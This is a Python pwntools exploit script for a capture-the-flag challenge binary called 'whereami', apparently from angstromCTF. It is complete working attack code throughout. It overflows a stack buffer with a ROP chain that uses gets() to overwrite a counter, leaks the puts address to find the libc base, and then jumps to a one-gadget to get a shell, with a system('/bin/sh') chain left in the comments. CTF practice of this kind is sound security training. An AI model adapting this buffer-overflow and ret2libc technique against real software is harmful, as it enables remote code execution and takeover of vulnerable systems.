#!/usr/bin/env python3
#2-05-2022
#arbitrary write with gets()
#libc leak

from pwn import *

exe = ELF('whereami_patched')
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('ld-2.31.so', checksec=False)

context.binary = exe
context.log_level='debug'

offset = 72
counter = 0x40406c
pop_rdi = 0x0000000000401303 #: pop rdi; ret; 

def conn():
    if args.REMOTE:
        io = remote("challs.actf.co", 31222)
    else:
        io = process(exe.path)
        if args.DEBUG:
            gdb.attach(io)

    return io

io = conn()

#overwrite counter with gets()
payload = flat({
    offset:[
        pop_rdi,
        counter,
        exe.plt.gets,
        exe.sym.main
        ]
    })


write('payload', payload)
io.sendlineafter(b'Who are you? ', payload)
io.sendline(p32(0xffffffff))

#Leak libc base addr with puts
rop = ROP(exe)
rop.puts(exe.got.puts)
rop.main()
io.sendline(flat({offset: rop.chain()}))
for i in range(2):
    io.recvuntil(b'too.\n')
leak = io.recvuntil(b'\n')
leak = u64(leak.rstrip().ljust(8, b'\x00'))
libc.address = leak - libc.sym.puts
info("Puts:%#x", leak)
info("Libc base:%#x", libc.address)

payload = flat({
    offset:[
        p64(libc.address + 0xe3b31) #onegadget
        #pop_rdi,
        #next(libc.search(b"/bin/sh\x00")),
        #pop_rdi+1, #ret
        #libc.sym['system']
    ]
    })

io.sendlineafter(b'Who are you? ', payload)

io.interactive()
